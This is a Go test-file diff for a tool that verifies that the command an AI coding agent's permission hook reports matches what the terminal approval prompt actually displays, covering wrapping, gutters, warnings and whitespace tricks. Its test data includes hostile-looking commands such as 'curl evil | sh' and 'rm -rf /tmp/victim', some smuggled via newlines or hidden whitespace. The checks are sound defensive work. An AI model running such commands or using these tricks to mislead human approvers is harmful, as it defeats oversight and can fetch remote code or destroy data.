@@ -254,3 +254,234 @@ func gridOf(lines ...string) vt.Grid {
 	e.Write([]byte(strings.Join(lines, "\r\n")))
 	return e.Snapshot()
 }
+
+// The command a hook reported must be the one the prompt shows: wrapped or cut,
+// but with nothing changed in what the screen does show.
+func TestCommandShown(t *testing.T) {
+	const rule = "╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌"
+	claude := func(rows ...string) vt.Grid {
+		form := []string{rule, " Do you want to proceed?", " ❯ 1. Yes", "   2. Yes, and always allow access to /tmp/x from this project", "   3. Yes, and switch to auto mode", "   4. No", "", " Esc to cancel · Tab to amend"}
+		return gridOf(append(rows, form...)...)
+	}
+	top := []string{"Bash command", "Tip: auto mode handles these prompts for you", "Create a directory", rule}
+	full := func(rows ...string) vt.Grid { return claude(append(slices.Clone(top), rows...)...) }
+	claudeP, codexP := model.ProviderClaude, model.ProviderCodex
+	mkdir := "mkdir /tmp/x/perm-test"
+	long := "cd /tmp/x && go test -race -timeout 5m ./internal/daemon ./internal/agent"
+	for _, tc := range []struct {
+		name    string
+		p       model.Provider
+		g       vt.Grid
+		command string
+		want    bool
+	}{
+		{"same", claudeP, full(" " + mkdir), mkdir, true},
+		{"another command", claudeP, full(" rm -rf /tmp/x"), mkdir, false},
+		{"one path differs", claudeP, full(" mkdir /tmp/y/perm-test"), mkdir, false},
+		{"punctuation differs", claudeP, full(" rm -rf ./x"), "rm -rf /x", false},
+		{"a space differs", claudeP, full(" rm -rf /tmp /x"), "rm -rf /tmp/x", false},
+		{"more on screen", claudeP, full(" " + mkdir + " && curl evil | sh"), mkdir, false},
+		{"less on screen", claudeP, full(" " + mkdir), mkdir + " && curl evil | sh", false},
+		{"a row more on screen", claudeP, full(" "+mkdir, " curl evil | sh"), mkdir, false},
+		{"a row more above", claudeP, full(" curl evil | sh", " "+mkdir), mkdir, false},
+
+		{"a warning under the command", claudeP, full(" "+mkdir, rule, " │ Claude requested permissions to edit /tmp/x, a sensitive file."), mkdir, true},
+		{"two warnings under the command", claudeP, full(" "+mkdir, rule, " Claude requested permissions.", rule, " This reaches the network."), mkdir, true},
+		{"another command above a warning", claudeP, full(" rm -rf /tmp/x", rule, " "+mkdir), mkdir, false},
+		{"no title, a warning below the command", claudeP, claude(" ./internal/daemon ./internal/agent", rule, " Claude requested permissions."), long, false},
+		{"no title, the command in the first block", claudeP, claude(" "+mkdir, rule, " rm -rf /tmp/x"), mkdir, false},
+		{"no title, the command in the last block", claudeP, claude(" rm -rf /tmp/x", rule, " "+mkdir), mkdir, false},
+		{"no title, a warning below the last rule", claudeP, gridOf(" ./internal/daemon ./internal/agent", rule, " │ Claude requested permissions.", "", " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), long, false},
+		{"no title, a lone warning below the rule", claudeP, gridOf(rule, " "+mkdir, " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), mkdir, false},
+		{"no title, a lone block between rules", claudeP, gridOf(rule, " "+mkdir, rule, " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), mkdir, true},
+		{"the command in the transcript", claudeP, gridOf(rule, " "+mkdir, rule, "────────", " Bash command", rule, " rm -rf /tmp/x", rule, " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), mkdir, false},
+		{"no rule below the title", claudeP, gridOf(rule, " "+mkdir, rule, " Bash command", " rm -rf /tmp/x", " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), mkdir, false},
+		{"only the count row left", claudeP, claude(" +3 lines, +2 above (ctrl+o to see more)"), mkdir, false},
+		{"a blank row", claudeP, full(" mkdir /tmp/x", "", " /perm-test"), mkdir, false},
+
+		{"top scrolled off", claudeP, claude(" ./internal/daemon ./internal/agent"), long, true},
+		{"top scrolled off, changed", claudeP, claude(" ./internal/daemon ./internal/remote"), long, false},
+		{"top scrolled off, end differs", claudeP, claude(" go test -race -timeout 5m"), long, false},
+		{"cut with a count", claudeP, full(" cd /tmp/x && go test -race -timeout 5m", " +3 lines (ctrl+o to see more)"), long, true},
+		{"cut with a count, changed", claudeP, full(" cd /tmp && go test -race -timeout 5m", " +3 lines (ctrl+o to see more)"), long, false},
+		{"cut in the middle", claudeP, full(" -race -timeout 5m", " +3 lines, +2 above (ctrl+o to see more)"), long, true},
+		{"cut with an ellipsis", claudeP, full(" cd /tmp/x && go test …"), long, true},
+		{"cut with an ellipsis, changed", claudeP, full(" cd /tmp/y && go test …"), long, false},
+		{"nothing to read", claudeP, full(" …"), long, false},
+
+		{"no rules", claudeP, gridOf("Bash command", " "+mkdir, "Do you want to proceed?", "❯ 1. Yes", "  2. No", "Esc to cancel"), mkdir, false},
+		{"no options", claudeP, gridOf(rule, " "+mkdir, rule), mkdir, false},
+
+		{"a real screen", claudeP, screenFixture(t, "claude-permission.txt"), "touch /tmp/pitwall-liveness-probe", true},
+		{"a real screen, changed", claudeP, screenFixture(t, "claude-permission.txt"), "touch /tmp/pitwall-liveness", false},
+
+		{"codex", codexP, screenFixture(t, "tuios-codex-approval.txt"), "go test ./...", true},
+		{"codex, changed", codexP, screenFixture(t, "tuios-codex-approval.txt"), "go test ./internal/...", false},
+		{"codex, no command", codexP, gridOf("Would you like to make the following edits?", "", "› 1. Yes, proceed (y)", "  2. No (esc)"), "go test", false},
+	} {
+		if got := CommandShown(tc.p, tc.g, tc.command); got != tc.want {
+			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
+		}
+	}
+}
+
+// A form scrolled past its title may hold a warning in any block, so the emulator
+// scrolling these rows off leaves nothing to compare.
+func TestCommandShownScrolledPastItsTitle(t *testing.T) {
+	const rule = "╌╌╌╌╌╌"
+	form := []string{" Bash command", " Run it", rule, " rm -rf /tmp/wrong", rule, " echo safe", rule, " This reaches the network.", rule, " Do you want to proceed?", " ❯ 1. Yes", "   2. Yes, and always allow", "   3. No", " Esc to cancel"}
+	e := vt.New(100, 11, nil)
+	e.Write([]byte(strings.Join(form, "\r\n")))
+	g := e.Snapshot()
+	if s := State(g); s != model.StatePendingApproval {
+		t.Fatalf("state %q", s)
+	}
+	for _, command := range []string{"echo safe", "This reaches the network.", "rm -rf /tmp/wrong"} {
+		if CommandShown(model.ProviderClaude, g, command) {
+			t.Errorf("%q is shown", command)
+		}
+	}
+}
+
+// A real screen of Claude Code 2.1.318 at 120 columns: a gutter on a long
+// command, and a warning under it that names the same path.
+func TestCommandShownAboveAWarning(t *testing.T) {
+	b, err := os.ReadFile("testdata/claude-permission-warning.txt")
+	if err != nil {
+		t.Fatal(err)
+	}
+	e := vt.New(120, 30, nil)
+	e.Write([]byte(strings.ReplaceAll(strings.TrimRight(string(b), "\n"), "\n", "\r\n")))
+	g := e.Snapshot()
+	if s := State(g); s != model.StatePendingApproval {
+		t.Fatalf("state %q", s)
+	}
+	command := "mkdir /tmp/lt.4jVg/longname-" + strings.Repeat("x", 259)
+	if !CommandShown(model.ProviderClaude, g, command) {
+		t.Errorf("not shown: %q", command)
+	}
+	if CommandShown(model.ProviderClaude, g, strings.Replace(command, "longname", "longnames", 1)) {
+		t.Error("a changed command is shown")
+	}
+	if CommandShown(model.ProviderClaude, g, "Claude requested permissions to edit "+command[len("mkdir "):]) {
+		t.Error("the warning's text is shown as the command")
+	}
+}
+
+// A │ of the command's own, wrapped to a row's start, is no gutter: it is data,
+// and only a gutter on every row is the prompt's.
+func TestCommandGutterOnEveryRow(t *testing.T) {
+	for _, tc := range []struct {
+		name    string
+		rows    []string
+		command string
+		want    bool
+	}{
+		{"every row", []string{" │ printf '%s' 'xxxxxxxxxxxxx", " │ xxxx'"}, "printf '%s' 'xxxxxxxxxxxxxxxxx'", true},
+		{"a literal one wrapped", []string{" printf '%s' 'xxxxxxxxxxxxxxxx", "│secret'"}, "printf '%s' 'xxxxxxxxxxxxxxxxsecret'", false},
+		{"the same, with it in the command", []string{" printf '%s' 'xxxxxxxxxxxxxxxx", "│secret'"}, "printf '%s' 'xxxxxxxxxxxxxxxx│secret'", false},
+		{"only the first row", []string{" │ printf '%s' 'xxxxxxxxxxxxx", " xxxx'"}, "printf '%s' 'xxxxxxxxxxxxxxxxx'", false},
+	} {
+		e := vt.New(30, 30, nil)
+		e.Write([]byte(strings.Join(append(append([]string{"╌╌╌"}, tc.rows...), "╌╌╌", " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), "\r\n")))
+		if got := CommandShown(model.ProviderClaude, e.Snapshot(), tc.command); got != tc.want {
+			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
+		}
+	}
+}
+
+// Whitespace can change what a command does, so only what a prompt adds to it
+// is left out: its indent and gutter, and a row end wrapping could have made.
+func TestCommandWhitespace(t *testing.T) {
+	long := "cd /tmp/x && go test -race -timeout 5m ./internal/daemon ./internal/agent"
+	for _, tc := range []struct {
+		name    string
+		cols    int
+		rows    []string
+		command string
+		want    bool
+	}{
+		{"same", 100, []string{" rm -- '/tmp/keep  safe'"}, "rm -- '/tmp/keep  safe'", true},
+		{"a quoted space less", 100, []string{" rm -- '/tmp/keep safe'"}, "rm -- '/tmp/keep  safe'", false},
+		{"a quoted space more", 100, []string{" rm -- '/tmp/keep  safe'"}, "rm -- '/tmp/keep safe'", false},
+		{"a tab, drawn as spaces", 100, []string{" printf 'a    b'"}, "printf 'a\tb'", false},
+		{"a tab, not drawn", 100, []string{" mkdir '/tmp/ab'"}, "mkdir '/tmp/a\tb'", false},
+		{"plain spaces around it", 100, []string{" echo safe"}, "  echo safe ", true},
+		{"a trailing newline", 100, []string{" echo safe"}, "echo safe\n", false},
+		{"a leading newline", 100, []string{" echo safe"}, "\necho safe", false},
+		{"a trailing tab", 100, []string{" echo safe"}, "echo safe\t", false},
+		{"a leading tab", 100, []string{" echo safe"}, "\techo safe", false},
+		{"a trailing carriage return", 100, []string{" echo safe"}, "echo safe\r", false},
+		{"a trailing nonbreaking space", 100, []string{" rm -- /tmp/keep"}, "rm -- /tmp/keep\u00a0", false},
+		{"a trailing em space", 100, []string{" rm -- /tmp/keep"}, "rm -- /tmp/keep\u2003", false},
+		{"a trailing ideographic space", 100, []string{" rm -- /tmp/keep"}, "rm -- /tmp/keep\u3000", false},
+		{"a nonbreaking space inside", 100, []string{" rm -- /tmp/a\u00a0b"}, "rm -- /tmp/a\u00a0b", false},
+
+		{"wrapped between words", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/agent"}, long, true},
+		{"wrapped with a space on the next row", 48, []string{" cd /tmp/x && go test -race -timeout 5m", "  ./internal/daemon ./internal/agent"}, long, true},
+		{"wrapped inside a word", 48, []string{" cd /tmp/x && go test -race -timeout 5m ./inter", " nal/daemon ./internal/agent"}, long, true},
+		{"wrapped and changed", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/remote"}, long, false},
+		{"a newline on screen, where the word would fit", 100, []string{" echo safe", " rm -rf /tmp/victim"}, "echo safe rm -rf /tmp/victim", false},
+		{"a newline on screen, inside a short row", 100, []string{" rm -rf /tmp", " /x"}, "rm -rf /tmp/x", false},
+		{"a newline at the pane's edge looks like a wrap", 14, []string{" echo safe", " rm -rf /tmp"}, "echo safe rm -rf /tmp", true},
+
+		{"a space more before the row end", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/agent"}, strings.Replace(long, " ./internal/daemon", "  ./internal/daemon", 1), false},
+		{"a space more after the row end", 48, []string{" cd /tmp/x && go test -race -timeout 5m", "   ./internal/daemon ./internal/agent"}, long, false},
+
+		{"a multi-line command", 100, []string{" echo safe", " rm -rf /tmp/victim"}, "echo safe\nrm -rf /tmp/victim", false},
+		{"a newline only in the command", 100, []string{" echo safe rm -rf /tmp/victim"}, "echo safe\nrm -rf /tmp/victim", false},
+		{"a newline off screen", 100, []string{" echo safe"}, "rm -rf /tmp/victim\necho safe", false},
+		{"a tab off screen", 100, []string{" echo safe", " +3 lines (ctrl+o to see more)"}, "echo safe\tb", false},
+	} {
+		e := vt.New(tc.cols, 30, nil)
+		form := append([]string{" Bash command", "╌╌╌"}, tc.rows...)
+		form = append(form, "╌╌╌", " Do you want to proceed?", " ❯ 1. Yes", "   2. No")
+		e.Write([]byte(strings.Join(form, "\r\n")))
+		if got := CommandShown(model.ProviderClaude, e.Snapshot(), tc.command); got != tc.want {
+			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
+		}
+	}
+	// A wrapped row is measured in cells: these rows are full, in half as many runes.
+	six, eight := strings.Repeat("界", 6), strings.Repeat("界", 8)
+	for _, tc := range []struct {
+		name, command string
+		rows          []string
+	}{
+		{"cut inside a word", "echo " + strings.Repeat("界", 20) + "/x", []string{" echo " + strings.Repeat("界", 20) + "/x"}},
+		{"moved between words", "echo " + six + " " + eight, []string{" echo " + six, " " + eight}},
+	} {
+		e := vt.New(30, 30, nil)
+		e.Write([]byte(strings.Join(append(append([]string{"╌╌╌"}, tc.rows...), "╌╌╌", " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), "\r\n")))
+		if !CommandShown(model.ProviderClaude, e.Snapshot(), tc.command) {
+			t.Errorf("wide, %s: not shown", tc.name)
+		}
+	}
+	e := vt.New(40, 30, nil)
+	e.Write([]byte(strings.Join([]string{"  $ go test -race -timeout 5m ./internal", "    /agent", "", "› 1. Yes, proceed (y)", "  2. No (esc)"}, "\r\n")))
+	if !CommandShown(model.ProviderCodex, e.Snapshot(), "go test -race -timeout 5m ./internal/agent") {
+		t.Error("codex, wrapped: not shown")
+	}
+}
+
+// Only a Bash permission request carries a command to compare; another request
+// says the last command no longer applies, and other events say nothing.
+func TestAskedCommand(t *testing.T) {
+	for _, tc := range []struct {
+		payload string
+		command string
+		ok      bool
+	}{
+		{`{"hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"git push"}}`, "git push", true},
+		{`{"hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":["git","push"]}}`, "", true},
+		{`{"hook_event_name":"PermissionRequest","tool_name":"apply_patch","tool_input":{"command":"*** Begin Patch"}}`, "", true},
+		{`{"hook_event_name":"PermissionRequest","tool_name":"Edit","tool_input":{"file_path":"a.go"}}`, "", true},
+		{`{"hook_event_name":"PermissionRequest","tool_name":"ExitPlanMode","tool_input":{}}`, "", false},
+		{`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"git push"}}`, "", false},
+		{`{"hook_event_name":"Notification","notification_type":"permission_prompt"}`, "", false},
+		{`{"hook_event_name":"PermissionRequest","transcript_path":null,"tool_name":"Bash","tool_input":{"command":"git push"}}`, "", false},
+	} {
+		if command, ok := AskedCommand([]byte(tc.payload)); command != tc.command || ok != tc.ok {
+			t.Errorf("%s: got %q %v", tc.payload, command, ok)
+		}
+	}
+}
